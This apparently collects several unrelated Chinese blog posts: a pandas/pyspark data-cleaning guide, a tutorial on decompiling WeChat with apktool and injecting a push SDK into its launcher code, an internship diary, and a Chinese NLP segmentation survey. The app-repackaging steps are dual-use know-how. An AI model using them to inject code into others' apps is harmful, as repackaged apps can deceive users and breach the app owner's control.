c","d"
"4","6,7","8"

pandas
# -*- coding:utf-8 -*-
"""@author:season@file:testCSV.py@time:2018/5/3110:49"""
import  pandas

def sum_analysis(filename,col_names):
    # 读csv文件
    data = pandas.read_csv(filename,names=col_names,\
    engine='python', dtype=str)
    # 返回前n行
    first_rows = data.head(n=2)
    print(first_rows)
    # 返回全部列名
    cols = data.columns
    print(cols)
    # 返回维度
    dimensision = data.shape
    print(dimensision)
    print(data.info())
    return data

def main():
    col_names = ['1','2','3']
    file_test = u'''test.csv'''
    print(sum_analysis(file_test,col_names))

if __name__=='__main__':
    main()



  pandas 加载的 result
pyspark
sdf = spark.read.option("header","true") \
				 .option("charset","gbk") \
				 .option("multiLine", "true") \
				  .csv("s3a://your_file*.csv")
pdf = sdf.limit(1000).toPandas()

linux 命令
强大的sed命令，去除两个双引号中的换行
**处理结果放入新文件**
sed ':x;N;s/\nPO/ PO/;b x' INPUTFILE  > OUTPUTFILE

**处理结果覆盖源文件**
sed -i ':x;N;s/\nPO/ PO/;b x' INPUTFILE

2.1 文件转码
当然，有些情况还有由于文件编码造成的乱码情况，这时候就轮到linux命令大显神威了。
比如 使用enconv 将文件由汉字编码转换成utf-8
enconv -L zh_CN -x UTF-8 filename

或者要把当前目录下的所有文件都转成utf-8
enca -L zh_CN -x utf-8 *     

在Linux中专门提供了一种工具convmv进行文件名编码的转换，可以将文件名从GBK转换成UTF-8编码,或者从UTF-8转换到GBK。
下面看一下convmv的具体用法：
	convmv -f 源编码 -t 新编码 [选项] 文件名

#将目录下所有文件名由gbk转换为utf-8
convmv -f GBK -t UTF-8 -r --nosmart --notest /your_directory


2.2 指定列名
在spark 中
如何把别的dataframe已有的schame加到现有的dataframe 上呢？
from pyspark.sql.types import *
diagnosis_sdf_new = diagnosis_sdf.rdd.toDF(diagnosis_sdf_tmp.schema)

2.3 pyspark dataframe 新增一列并赋值
http://spark.apache.org/docs/latest/api/python/pyspark.sql.html?highlight=functions#module-pyspark.sql.functions
统一值

from pyspark.sql import functions
df = df.withColumn('customer',functions.lit("eng_string"))

#或者这么写
df = df.select('*', (df.age + 10).alias('agePlusTen'))


不同值，写udf
from pyspark.sql.types import IntegerType
from pyspark.sql.functions import udf

def func(fruit1, fruit2):
    if fruit1 == None or fruit2 == None:
        return 3
    if fruit1 == fruit2:
        return 1
    return 0

func_udf = udf(func, IntegerType())
df = df.withColumn('new_column',func_udf(df['fruit1'], df['fruit2']))


2.4 时间格式处理与正则匹配

#1.日期和时间的转码,神奇的任意时间识别转换接口

import dateutil.parser
d = dateutil.parser.parse('2018/11-27T12:00:00')
print(d.strftime('%Y-%m-%d %H:%M:%S'))

#如果本来这一列是数据而写了其他汉字，则把这一条替换为0，或者抛弃？，置空

is_float = re.compile(r'^[-+]?[0-9]+\.[0-9]+$')


3. 缺失值的处理
pandas
pandas使用浮点值NaN(Not a Number)表示浮点数和非浮点数组中的缺失值，同时python内置None值也会被当作是缺失值。
如果其中有值为None，Series会输出None，而DataFrame会输出NaN，但是对空值判断没有影响。DataFrame使用isnull方法在输出空值的时候全为NaN
例如对于样本数据中的年龄字段，替换缺失值，并进行离群值清洗
pdf["AGE"] = pd.to_numeric(pdf["AGE"],"coerce").fillna(500.0).astype("int")

pdf[(pdf["AGE"] > 0) & (pdf["AGE"] < 150)]

自定义过滤器过滤
#Fix gender
def fix_gender(x):
    if x is None:
        return None
    if "男" in x:
        return "M"
    if "女" in x:
        return "F"
pdf["PI_SEX"] = pdf["PI_SEX"].map(fix_gender)
or
pdf["PI_SEX"] = pdf["PI_SEX"].apply(fix_gender)


或者直接删除有缺失值的行
data.dropna()

pyspark
spark 同样提供了，.dropna(…) ，.fillna(…) 等方法，是丢弃还是使用均值，方差等值进行填充就需要针对具体业务具体分析了
#查看application_sdf每一列缺失值百分比
import pyspark.sql.functions as fn
queshi_sdf = application_sdf.agg(*[(1-(fn.count(c) /fn.count('*'))).alias(c+'_missing') for c in application_sdf.columns])

queshi_pdf  = queshi_sdf.toPandas()
queshi_pdf




4. 数据质量核查与基本的数据统计
对于多来源场景下的数据，需要敏锐的发现数据的各类特征，为后续机器学习等业务提供充分的理解，以上这些是离不开数据的统计和质量核查工作，也就是业界常说的让数据自己说话。
4.1 统一单位
多来源数据 ，突出存在的一个问题是单位不统一，比如度量衡，国际标准是米，然而很多北美国际习惯使用英尺等单位，这就需要我们使用自定义函数，进行单位的统一换算。
比如，有时候我们使用数据进行用户年龄的计算，有的给出的是出生日期，有的给出的年龄计算单位是周、天，我们为了模型计算方便需要统一进行数据的单位统一，以下给出一个统一根据出生日期计算年龄的函数样例。
4.1.1 年龄
import datetime

def CalculateAge(str_Date):
    '''Calculates the age and days until next birthday from the given birth date'''
    try:
      Date = str_Date.split(' ')[0].split('-')
      BirthDate = datetime.date(int(Date[0]), int(Date[1]), int(Date[2]))
      Today = datetime.date.today()
      if (Today.month > BirthDate.month):
        NextYear = datetime.date(Today.year + 1, BirthDate.month, BirthDate.day)
      elif (Today.month < BirthDate.month):
        NextYear = datetime.date(Today.year, Today.month + (BirthDate.month - Today.month), BirthDate.day)
      elif (Today.month == BirthDate.month):
        if (Today.day > BirthDate.day):
          NextYear = datetime.date(Today.year + 1, BirthDate.month, BirthDate.day)
        elif (Today.day < BirthDate.day):
          NextYear = datetime.date(Today.year, BirthDate.month, Today.day + (BirthDate.day - Today.day))
        elif (Today.day == BirthDate.day):
          NextYear = 0
      Age = Today.year - BirthDate.year
      return  Age
      # if NextYear == 0: #if today is the birthday
      #   return '%d, days until %d: %d' % (Age, Age+1, 0)
      # else:
      #   DaysLeft = NextYear - Today
      #   return '%d, days until %d: %d' % (Age, Age+1, DaysLeft.days)
    except:
      return 'Wrong date format'
## 如果用在spark 的udf 中

from pyspark.sql.functions import udf
CalculateAge = udf(CalculateAge, IntegerType())
# Apply UDF function
Member_df = Member_df.withColumn("AGE", CalculateAge(Member_df['date of birthday']))

由身份证号获取年龄
import datetime

def get_age(id):
    """通过身份证号获取年龄"""
    birth_year = int(id[6:10])
    birth_month = int(id[10:12])
    birth_day = int(id[12:14])
    
    now = (datetime.datetime.now() + datetime.timedelta(days=1))
    year = now.year
    month = now.month
    day = now.day

    if year == birth_year:
        return 0
    else:
        if birth_month > month or (birth_month == month and birth_day > day):
            return year - birth_year - 1
        else:
            return year - birth_year


4.1.2 日期
清洗日期格式字段
from dateutil import parser


def clean_date(str_date):
    try:
        if str_date:
            d = parser.parse(str_date)
            return d.strftime('%Y-%m-%d')
        else:
            return None
    except Exception as e:
         return None
        

        
def clean_schema_date(spark_df,column_Date):

    func_udf_clean_date = udf(clean_date, StringType())

    for column in column_Date:
          spark_df=spark_df.withColumn(column,  func_udf_clean_date(spark_df[column]))
            
    return spark_df





4.1.3 数字
#清洗数字格式字段

#如果本来这一列是数据而写了其他汉字，则把这一条替换为0，或者抛弃？，置空


def is_number(s):
    try:
        float(s)
        return True
    except ValueError:
        pass
    return False

def clean_number(str_number):

    try:
        if str_number:

                if is_number(str_number):
                    return str_number
                else:
                    return None
        else:
            return None
    except Exception as e:
        return None



func_udf_clean_number = udf(clean_number, StringType())

                 
def clean_schema_number(spark_df,column_number):

    for column in column_number:
          spark_df=spark_df.withColumn(column,  func_udf_clean_number(spark_df[column]))
    return spark_df

4.2 去重操作
pandas
去重操作可以帮助我们统计业务的核心数据，从而迅速抓住主要矛盾。例如，对于互联网公司来说，每天有很多的业务数据，然而发现其中的独立个体的独立行为才是数据分析人员应该注意的点。
data.drop_duplicates(['column'])

pyspark
使用dataframe api 进行去除操作和pandas 比较类似
sdf.select("column1","column2").dropDuplicates()

当然如果数据量大的话，可以在spark环境中算好再转化到pandas的dataframe中，利用pandas丰富的统计api 进行进一步的分析。
pdf = sdf.select("column1","column2").dropDuplicates().toPandas()

使用spark sql，其实我觉的这个spark sql 对于传统的数据库dba 等分析师来说简直是革命性产品， 例如：如下代码统计1到100测试中每一个测试次数的人员分布情况
count_sdf.createOrReplaceTempView("testnumber")

count_sdf_testnumber = spark.sql("\
SELECT tests_count,count(1) FROM \
testnumber where tests_count < 100 and lab_tests_count > 0 \
group by tests_count \
order by count(1) desc")

count_sdf_testnumber.show()


4.3 聚合操作与统计
pyspark 和pandas 都提供了类似sql 中的groupby 以及distinct 等操作的api，使用起来也大同小异，下面是对一些样本数据按照姓名，性别进行聚合操作的代码实例
pyspark
sdf.groupBy("SEX").agg(F.count("NAME")).show()

labtest_count_sdf = sdf.groupBy("NAME","SEX","PI_AGE").agg(F.countDistinct("CODE").alias("tests_count"))

spark sql

filename = "*.csv"
df = (spark
                 .read
                 .option("header","true")
                 .csv(filename)
                 .cache()
                )

df.createOrReplaceTempView("export")
df_Parents = spark.sql("SELECT STATUS,count(1) shuliang  FROM export where  TYPE = 'Parents' group by STATUS order by count(1) desc")
df_Parents.show()

pdf_Parents= df_Parents.toPandas()
pdf_Parents.plot(kind='bar')

plt.show()

顺带一句，pyspark 跑出的sql 结果集合，使用toPandas() 转换为pandas 的dataframe 之后只要通过引入matplotlib,  就能完成一个简单的可视化demo 了。


样例数据
d2 = pd.DataFrame({
    'label': [1,2,3],
    'count': [10,2,3],})

d2.plot(kind='bar')
plt.show()
d2.plot.pie(labels=['1', '2', '3'],subplots=True, figsize=(8, 4))
plt.show()



直方图，饼图
4.4 Top 指标获取
top 指标的获取说白了，不过是groupby 后order by 一下的sql 语句

5.数据导入导出
参考：数据库，云平台，oracle，aws，es导入导出实战

参考文献
做Data Mining，其实大部分时间都花在清洗数据
http://www.raincent.com/content-10-8092-1.html
基于PySpark大规模数据预处理
https://www.jianshu.com/p/b7882e9616c7
同时发表在：
https://blog.csdn.net/insightzen_xian/article/details/80659243

大数据ETL 系列文章简介
本系列文章主要针对ETL大数据处理这一典型场景，基于python语言使用Oracle、aws、Elastic search 、Spark 相关组件进行一些基本的数据导入导出实战，如：

oracle使用数据泵impdp进行导入操作。
aws使用awscli进行上传下载操作。
本地文件上传至aws es
spark dataframe录入ElasticSearch

等典型数据ETL功能的探索。
系列文章：
1.大数据ETL实践探索（1）---- python 与oracle数据库导入导出
2.大数据ETL实践探索（2）---- python 与aws 交互
3.大数据ETL实践探索（3）---- pyspark 之大数据ETL利器
4.大数据ETL实践探索（4）---- 之 搜索神器elastic search
5.使用python对数据库，云平台，oracle，aws，es导入导出实战
6.aws ec2 配置ftp----使用vsftp
7.浅谈pandas，pyspark 的大数据ETL实践经验

更多资讯，请关注公众号













作者：郭少雷
搞android搞了几年也没搞出个啥牛逼app出来，眼看时下最火的app微信如此火热，实在想搞搞它，索性就想着给它加点东西进去。
以下内容纯属本人个人爱好，仅限个人学习android用途以及对android的深入了解。
首先我们得想一想加点什么东西在微信里面，这里简单做个体验，加一个推送sdk至微信最新(6.5.7)apk包中，并由服务端控制向其推送消息。以下步骤依次讲解加入流程


1.申请推送平台
这里以个推为例并下载Getui_SDK；新建一Android Studio工程，包名同微信包名保持一致(com.tencent.mm)，新建一PushActivity用于获取启动个推SDK的smali代码片段。依据个推sdk创建相应DemoIntentService和DemoPushService；


2.获取资源文件
生成工程apk后使用ApkTool反编译生成好的apk后得到以下smali代码及资源文件。反编译apk文件 
命令：
    apktool d <file.apk> <dir>
 得到所有资源及代码文件。 


进入smali目录获取到PushActivity.smali中启动个推代码片段：


3.反编译
使用ApkTool反编译微信apk得到微信资源及smali代码：


4.定位onCreate方法
查看微信资源AndroidManifext.xml中启动Launcher的Activity为LauncherUI，打开LauncherUI.smali文件并找到onCreate方法：

在该方法最后加入启动个推smali代码，并将PushActivity改为Launcher所在位置后保存：


5.加入个推服务
保存个推用到的资源文件到微信目录后修改微信AndroidManifest.xml加入个推服务：


6.回编apk文件
命令：
apktool b <dir>
使用apk回编命令对微信资源目录进行回编后得到新的微信apk；安装启动后即可由个推服务端对客户端进行Push消息推送。

 






7月中旬，29个小时的火车，给我带到这么一个地方
岗头发展大厦十楼。

同事中确实不少极品，大家互相介绍的时候，有人
这么说他是怎么来深圳的：我以为深圳就在我们学校边上
所以我就果断的签约了。我以为大学生地理知识贫乏到如此
实属不易，而这样的极品chinasoft招了两个。集齐7个估计就能召唤神龙吧。
 
前期一切似乎在步入正轨，看书考试。后来渐渐，天天看书。
天天逛csdn。下午看一会，打篮球的同事就开始吆喝了。
刚开始比较低调，后来也没人管，索性放开了。村子里打球，
的人动作野蛮，后来也适应。只是这段篮球的时光也没持续多久
随着大前锋的离队北漂。篮球队也涣散了。
 
吃饭的时候，我们一般选择木桶饭，第一次看这个东西。我心里
一惊，这么大一桶，果断要整，其实桶里还放个小盆。。。后来
成天吃这个，索性饭菜分开，不吃盖浇的感觉了，俩月的地沟油
真心滋润了身心。话说，木桶有一道隐藏的菜——香辣带皮牛肉饭
，极品的室友，第一次看到的时候，招来服务员发问：问一下，
什么是香辣带皮？。一时间在部门实习生里传为一段佳话。
 
住的地方，蛮宽敞，只是屋前是一个臭水沟，左边是马路，后面是土坡，平时
一段时间，早起失眠，很早就自然醒了。我就去吃早茶，感觉每天能吃
最好的就是在早上，包子，韭菜饼，豆浆什么的，当然神器自然是——肠粉
也就是样子比较像，其实是面蒸的，多来点辣椒，其实能当热凉皮吃。
 
总的来说，深圳鱼龙混杂，关外这个地方鱼偏多，富士康华为两个
大企业几十万人就在一栋栋细长细长的城中村大楼里面当蚁族蜗居。
估计不少人是攒钱回家娶老婆类型，公司后面的村长的儿子
时不时开着法拉利在我们进村吃饭的时候扬长而去。所以这里的
产业链比较乱，基本是些食物链底端的生物，聚集多了，生态危机就来了。
 
chinasoft今年招了200多实习生，进项目的没几个。我所在的部门是2012实验室，进项目的基本是些测试的人员需求，开发的比较少，其实也很容易能想清楚，华为自己的开发人员都用不完，干嘛要用外包呢？多找几个mm进去测试多好，所以大部分的实习生都处在闲置的状态，也没有自己用来学习的机器
成天买些书来看，几个月下来，渐渐发现自己没有项目经验，贬值了。
也就有些能力好的自寻出路。
 
总体，来说，在深圳呆了俩月，就给我一个感觉-不开心！
挣钱太少，就得在这里死扛时间，扛到我边能行了，那就真太久了。另外一个人在外，自制力也成问题。深圳这边服务业太发达了，微信什么的约炮神器，差点就让人把持不住也是问题。门口有家按摩城，68两个点-推油，想想还是算了。
所以，我就果断买票回了。
 
深圳再见了。要是我有技术那在这里挣个大钱，还成。
没有技术，还是先回老家西安修炼修炼再说哈。
考个研什么的，看自己怎么选择了，人生职业道路到底怎么走，还真是迷茫啊。。。
 










文章大纲1.绪论2.短文本2.1 短文本的研究范围2.2 短文本特点3.中文分词3.1 基于字符串匹配和规则的分词方法3.2 基于统计的分词方法3.3 基于理解的分词方法4. 基于深度学习的短文本分析[参考2]4.1 自动编码器4.2受限玻尔兹曼机4.3 卷积神经网络5.为什么深度学习如此有效？[参考1]5.1主流深度学习模型对比6.文本分类效果评价7.短文本相关工具应用7.1 Word2vector7.2 标签云7.3 倾向性分析7.4 成熟案例----微博舆情分析8.主流分词工具对比分析8.1 总体介绍8.2 结巴和清华THULAC 介绍9.最新短文本分析开源库分享9.1多语言词向量 Python 库参考文献资源下载

1.绪论
过去几年，深度神经网络在模式识别中占绝对主流。它们在许多计算机视觉任务中完爆之前的顶尖算法。在语音识别上也有这个趋势了。而中文文本处理，以及中文自然语言处理上，似乎没有太厉害的成果？尤其是中文短文本处理的问题上，尚且没有太成功的应用于分布式条件下的深度处理模型？（大公司或许有，但没有开源）本文暂且梳理一下，尝试围绕深度学习和 短文本处理的方方面面就最简单的概念进行一次梳理，并且试图思考一个问题：
深度学习处理中文短文本的最终效果是什么？
我思考后的答案是：
答：是一种模型，可以无需任何语言学知识或手工特征设计，就可被用于中文分词、词性标注以及命名实体识别等多种中文自然语言处理任务，甚至直接改造为分布式大数据可以使用的框架。

2.短文本
姑且认为200字以内的都叫短文本
2.1 短文本的研究范围
- 搜索引擎的搜索结果
- 锚文本
- 互联网聊天信息
- 电子邮件主题
- 论坛评论信息
- 商品描述信息
- 图片描述
- 微博
- 手机短息
- 文档文献摘要

2.2 短文本特点
短文本具有特征稀疏性、奇异性、动态性、交错性等特点
①稀疏性。每条短文本形式信息的长度都比较短，都在 200 字以内，因此所包含的有效信息也就非常少，造成样本的特征非常稀疏，并且特征集的维数非常高，很难从中抽取到准确而关键的样本特征用于分类学习。
②实时性。在互联网上出现的短文本形式的信息，大部分都是实时更新的，刷新速度非常快，聊天信息、微博信息、评论信息等，并且文本数量非常庞大。
③不规则性。短文本形式的信息用语不规范，包含流行词汇较多，造成了噪声特征非常多，如“94”代表“就是”，“88”代表“再见”，“童鞋”代表“同学”，而且更新很快，如流行词“伤不起”、“有没有”、“坑爹” “屌丝”、等等。

3.中文分词
中文分词就是将连续的字序列按照一定的规范重新组合成词序列的过程。众所周知，英文单词是用空格来进行分隔的，在中文的字与字之间、句子与句子之间、段落与段落之间也都能找到分界符。另外，在中英文中都存在短语划分这个问题，但是词与词之间却找不到形式上的分界符。词是最小的能够独立活动的有意义的语言成分，因而，中文在词的划分这个问题上是个非常巧杂而关键的问题。
现有的分词算法可分为3大类：
3.1 基于字符串匹配和规则的分词方法
基于字符串匹配的分词方法又称为机械分词方法，它是按照一定的策略将待分析的汉字与一个＂足够大的＂词典中词条进行匹配，若在词典中找到某个字符串，则匹配成功。按照扫描方向的不同，串匹配分词方法可分为正向匹配和逆向匹配；按照不同长度优先匹配的倩况，可分为最大（最长）匹配和最小（最短）匹配；按照是否与词性标注过程相姐合，又可分为单纯分词方法和分词与标注相结合的一体化方法。
常用的基于字符串匹配的分词方法有：

A ）正向最大匹配法，按照文字的阅读顺序进行匹配；
B ）逆向最大匹配法，按照文字的阅读顺序反向进行匹配；
C ）最小切分法，使每一句中切出的词数量最少。由于汉语单字成词的特点，正向最小匹配和逆向最小匹配一般很少使用。


正向最大匹配法
逆向匹配的切分精度略髙于正向匹配，遇到的歧义现象也较少。统计结果显示，单纯使用正向最大匹配的错误率为1/169，单纯使用逆向最大匹配的错误率为1/245。但这种精度还远远不能满足实际的需要。
实际使用的分词系统，都是把机械分词作为一种初分手段，还需要通过利用各种其它的语言信息来进一步提高切分的准确率。上述方法虽然实现简单、速度快，但处理分词歧义能力较差，严重依赖于词表，不能识别新词语，即未登录词。为了解决分词歧义与未登录词的问题，９０年代初期出现了基于规则的分词系统，包括专家系统、短语结构文法等。基于规则的＂演泽推理＂方法，能较好的解决有规律的分词歧义和未登录词，具有一定的领域适应性、效率很髙。但中文语言现象非常复杂，存在很多无规律的分词歧义和未登录词。因此 一般采用其他算法如：动态规划等相结合提高准确率。
3.2 基于统计的分词方法
基于统计的分词方法只需对语料中的字信息进行统计，不需要切分词典，因而又称为无词典分词法或统计取词法。从形式上看，词是稳定的字的组合，在上下文中，相邻的字同时出现的次数越多，就越有可能构成一个词。因此字与字相邻共现的频率或概率能够较好的反映成词的可信度。因而可对语料中相邻共现的各个字的组合的频度进行统计，计算它们的相关度，计算两个汉字Ａ、Ｂ的相邻共现的概率。可对语料中相邻共现的各个字的组合的频率进行统计。
这种方法首先切分与词典能匹酷成功的所有可能的词，即找出所有候选词条，然后运用统计语言模型和决策算法得出最优的切分结果。
由于纯粹从统计的角度出发，因此在统计意义上某些经常出现在一起的字并不能构成完整的词语，例如＂上的＂、＂有的＂、＂这一＂等在文本中会大量的互邻同现,但它们却分属于不同的词；并且统计语言模型和决策算法在很大程度上决定了解决歧义的方法，需要大量的标注语料，并且分词速度也因搜索空间的増大而有所减慢。基于统计的分词方法所应用的主要的统计量或统计模型有：互信息、隐马尔可夫模型和最大熵模型等。这些统计模型主要是利用词与词之间的联合出现概率作为分词判断的信息。
3.3 基于理解的分词方法
这种分词方法是通过让计算机模拟人对句子的理解，达到识别词的效果。其基本思想就是在分词的同时进行句法、语义分析，利用句法信息和语义信息来处理歧义现象。它通常包括几个部分：分词子系统、句法语义子系统、总控部分。
在总控部分的协调下，分词子系统可获得有关词、句子等的句法和语义信息来对分词歧义进行判断，即它模拟了人对句子的理解过程。这种分词方法需要使用大量的语言知识和信息。由于汉语语言知识的笼统、复杂性，难Ｗ将各种语言信息组织成机器可直接读取的形式，因此目前基于机器学习理解的分词系统还处在实验阶段。


基于隐马尔可夫模型的字标注中文分词方法。


基于层叠隐马尔可夫模型的汉语词法分析方法，该方法引入角色隐马尔可夫模型识别未登录词。然而，传统机器学习方法往往依赖于人工设计的特征，而一个特征是否有效需要多尝试与选择，因此人工设计一系列好的特征既费时又费力。


神经网络方法。


深度学习的方法，对中文语料进行中文分词和词性标注。这些方法仅接近与目前最好结果，并没有超越。



4. 基于深度学习的短文本分析参考2
深度学习(Deep Learning)是一种表示学习方法，它通过对数据进行多层级的建模来获得关于数据特征的层次结构以及数据的分布式表示。由于深度学习可以避免繁琐的人工特征抽取，有效地利用无监督数据，并且具有优秀的泛化能力，因此成为了最近几年机器学习领域的一个热点。
深度学习的发展与应用使得图像处理、语音识别等多个具体的应用领域都取得了突破式的进展。深度学习非常适用于解决自然语言处理领域的一系列难题。
首先，由于语言本身的高维特性，传统的自然语言处理系统往往需要复杂的语言学知识以便手工构造出可供分类器使用的特征。而利用深度学习，则可以通过构造模型来自动学习用于解决自然语言处理领域的问题所需的特征。
其次，在自然语言处理领域，无标签数据可以被轻易地大量获得，然而有标签数据则相对稀少且昂贵，深度学习则刚好可以利用大量无标签数据来获取特征。再次，自然语言处理领域的许多问题往往相互之间具有非常强的关联性，例如对分词、词性标注和命名实体识别，传统的方法往往将这几个问题分开解决，忽略了它们之间的关系。使用深度学习则可以在特征抽取层面构造统一的模型以同时处理这些问题，并通过多任务学习的方法在模型中对其关联性进行建模，从而获得更好的性能。
因此，深度学习的核心思想是通过具有一定“深度”的模型从数据中逐层抽象出特征(即分布式表示)，并且在深度学习模型中越高的层级抽取出的特征具有越强的表达能力。据内部的特征信息，对于语言来说，这正是一个可以采纳的方式：从大量的文本中学习得到语义，并对语义进行特征表示，从而利用这些特征进行具体的计巧任务。
深度学习模型参考3

4.1 自动编码器
自动编码器（Auto—Encoder）是一种数据驱动的、非监督地学习数据特征的神经网络模型。其结构如所示。可Ｗ把它看成是一个输出节点数与输入节点数相等的多层神经网络。

4.2受限玻尔兹曼机
玻尔兹曼机（Boltzmann Machine）是一种引入了模拟退火思想的无向图模型，其根据无向图节点的状态和节点之间的互联权重定义整个系统的能量状态，并指定输入节点和输出节点为可见节点，在输入节点的二值化特征信息不变的情况下对其它节点进行退火，寻找最低的能量状态，即通过模拟退火的思想学习节点的互联权重作为模式的表示。
受限玻尔兹曼机（Restricted Boltzmann Machine，RBM）是一种特殊的玻尔兹曼机，是深度置信网（Deep Belief Networks，DBN）的核心组件之一。它规定无向图节点分为可见层和隐含层两层，每层内部的节点之间不可互联，而处于不同层之间的节点为全连接

4.3 卷积神经网络
卷积神经网络主要包括两种神经层：卷积层（Ｃｏｎｖｏｌｕｔｉｏｎ）和池化层（又称下采样层，Ｐｏｏｌｉｎｇ）。这两层往往搭配出现。如图２－６所示一个典型的卷积神经网络模型一般包括数个卷积层与池化层的组合，在此之后的几层是神经网络的全连接层
卷积层是卷积神经网络的主要运算部分。卷积层的输入是一幅或多幅二维图像，这些图像被称为特征图像（ＦｅａｔｕｒｅＭａｐ）。每个输出特征图像对应一个卷积核，该卷积核对一幅或多幅输入图像进行卷积，卷积的结果取平均得到一幅输出特征图像
目前，深度学习在自然语言处理上取得的进展没有在语音图像上那么令人印象深刻。但相比于声音和图像，语言是唯一的非自然信号，是完全由人类大脑产生和处理的符号系统。因此，深度学习在自然语言处理领域中的应用研究仍存在诸多的挑战。

5.为什么深度学习如此有效？参考1
深度学习中的表征视角是非常有力的，比如单词嵌入深度学习可以将非常复杂的关系进行近似编码：

原文中这样说：
这看来是神经网络的一个非常强大的优点：它们能自动学习更好的数据表征的方法。反过来讲，能有效地表示数据对许多机器学习问题的成功都是必不可少的。单词嵌入仅仅是学习数据表示中一个引人注目的例子而已。
5.1主流深度学习模型对比
概述对比

一个开源的深度学习测试框架参考9：对可扩展性（extensibility）、hardware utilization（硬件利用率）以及大家最关心的：速度（speed）上进行了比较
比较结果：

tensorflow比较中规中矩，我不认为其他几个库在后期能比他强多少，毕竟google出品，哈哈。现在不少企业都已经开始用tensorflow进行一些工程实践，大势所趋，同志们站好队啊。（欢迎同志们拍砖）

6.文本分类效果评价
很多时候，文本分析领域需要很多的评价准则，但是我看了不少论文，来回来去也就是基于分类的评价去做，这块还需要大牛给指点一二。
怎么能够客观的表示我们算法的准确行，分词，词性标注，等等
国际上广泛采用微平均和宏平均相结合的评价准则，并采用准确率P（Precision）和召回率R（Recall）以及F1值来衡量分类系统性能。
对第i个类别，其准确率和召回率分别定义如下：li表示分类的结果中被标记为第i类别且标记为正确的文本个数，mi表示结果中表示被标记为第i个类的文本个数，ni表示被分类的文本中实际属于第i个类别的样本个数。

微平均和宏平均
微平均和宏平均是计算全局的查准率，查全率和F1测试值的两种方法。其中，微平均用mP、mR、mF1来表示：宏平均用MP、MR、MF1来表示，公式如下：


7.短文本相关工具应用
7.1 Word2vector
word2vector由Google开发的一个用于训练语义向量的工具，其核心的技术是根据词频用Huffman编码使得所有词频相似的词隐藏层激活的巧内容基本一致，出现频率越高的词语，其隐藏层数目越少，然后采用一个三层神经网络对语义单元向量进行表示。具体可参考此说明文档参考10

快速入门:

7.2 标签云
回头打算，把自己的csdn博客爬一遍，写个python生成的标签云
哈哈，2018年12月这个系列已经开始了：
我给他起名叫做《简单中文NLP分析套路》----
简单NLP分析套路（1）----语料库积累之3种简单爬虫应对大部分网站

7.3 倾向性分析
商品论坛评论（开门见山和卒章显志是汉语语篇的重要特点）

7.4 成熟案例----微博舆情分析



8.主流分词工具对比分析
8.1 总体介绍
主流分词概况：

分词准确度：

在所测试的四个数据集上，BosonNLP和哈工大语言云都取得了较高的分词准确率，尤其在新闻数据上。因为庖丁解牛是将所有可能成词的词语全部扫描出来（例如：“最不满意”分为：“最不 不满 满意”），与其他系统输出规范不同，因而不参与准确率统计。为了更直接的比较不同数据源的差别，我们从每个数据源的测试数据中抽取比较典型的示例进行更直观的对比。
大数据评测结果：jieba(c++)版独领风骚啊

8.2 结巴和清华THULAC 介绍
1.THULAC 清华新推荐的分词工具 参考8
THULAC（THU Lexical Analyzer for Chinese）由清华大学自然语言处理与社会人文计算实验室研制推出的一套中文词法分析工具包，具有中文分词和词性标注功能。THULAC具有如下几个特点：
能力强
利用我们集成的目前世界上规模最大的人工分词和词性标注中文语料库（约含5800万字）训练而成，模型标注能力强大。
准确率高
该工具包在标准数据集Chinese Treebank（CTB5）上分词的F1值可达97.3％，词性标注的F1值可达到92.9％，与该数据集上最好方法效果相当。
速度较快
分词速度同时进行分词和词性标注速度为300KB/s，每秒可处理约15万字。只进行分词速度可达到1.3MB/s。
2.Jieba 参考7
Jieba分词是中文分词领域使用非常广泛的自由软件，其采用MIT授权协议，支持繁体分词并且支持自定义词典。
Jieba分词支持三种分词模式：
1. 精确模式，试图将句子最精确地切开，适合文本分析；

2. 全模式，把句子中所有的可以成词的词语都扫描出来, 速度非常快，但是不能解决歧义；

3. 搜索引擎模式，在精确模式的基础上，对长词再次切分，提高召回率，适合用于搜索引擎分词。

基本实现算法

基于前缀词典实现高效的词图扫描，生成句子中汉字所有可能成词情况所构成的有向无环图 (DAG)
采用了动态规划查找最大概率路径, 找出基于词频的最大切分组合
对于未登录词，采用了基于汉字成词能力的 HMM 模型，使用了 Viterbi 算法

分词速度

1.5 MB / Second in Full Mode
400 KB / Second in Default Mode
测试环境: Intel® Core™ i7-2600 CPU @ 3.4GHz；《围城》.txt


9.最新短文本分析开源库分享
9.1多语言词向量 Python 库
https://github.com/facebookresearch/MUSE
由 Facebook 开源的多语言词向量 Python 库，提供了基于 fastText 实现的多语言词向量和大规模高质量的双语词典，包括无监督和有监督两种。其中有监督方法使用双语词典或相同的字符串，无监督的方法不使用任何并行数据。
无监督方法具体可参考 Word Translation without Parallel Data 这篇论文。
##9.2 FoolNLTK中文处理工具包
根据该项目所述，这个中文工具包的特点有如下几点：

可能不是最快的开源中文分词，但很可能是最准的开源中文分词
基于 BiLSTM 模型训练而成
包含分词，词性标注，实体识别, 都有比较高的准确率
用户自定义词典

在中文信息处理中，分词（word segmentation）是一项基本技术，因为中文的词汇是彼此相连的，不像英文有一个天然的空格符可以分隔不同的单词。虽然把一串汉字划分成一个个词对于汉语使用者来说是很简单的事情，但对机器来说却很有挑战性，所以一直以来分词都是中文信息处理领域的重要的研究问题。
如该项目所述，作者使用了双向 LSTM 来构建整个模型，这也许是作者对分词性能非常有信心的原因。在中文分词上，基于神经网络的方法，往往使用「字向量 + 双向 LSTM + CRF」模型，利用神经网络来学习特征，将传统 CRF 中的人工特征工程量将到最低。

参考介绍：
http://blog.csdn.net/Uwr44UOuQcNsUQb60zk2/article/details/78927752

参考文献
[参考1]: http://blog.jobbole.com/77709/
[参考2]: 李岩. 基于深度学习的短文本分析与计算方法研究[D]. 北京科技大学, 2016.
[参考3]: 吴轲. 基于深度学习的中文自然语言处理[D]. 东南大学, 2014.
[参考4]: http://www.52nlp.cn/
[参考5]: http://www.cnblogs.com/softidea/p/5981809.html
[参考6]: http://www.ltp-cloud.com/
[参考7]: https://github.com/fxsjy/jieba/
[参考8]:http://thulac.thunlp.org/
https://github.com/HIT-SCIR/ltp/

资源下载
短文本论文资源打包
http://download.csdn.net/detail/wangyaninglm/9793894

p.s.
第一版的这篇博客本来打算推荐这本《NLP汉语自然语言处理原理与实践》的，但是，我读了读发现，这书有点问题：
1.参照的核心代码是个java的，解释的不太到位
2.部分内容未经考证，盲目引用
书中说了一个九个字的姓，结果网上一查，有点怀疑真伪


3.价格偏贵，98元！几种概率图模型堆积公式并不是很清晰
我想了又想，认为，钱多的人买一本，钱少的，还是算了
http://www.threedweb.cn










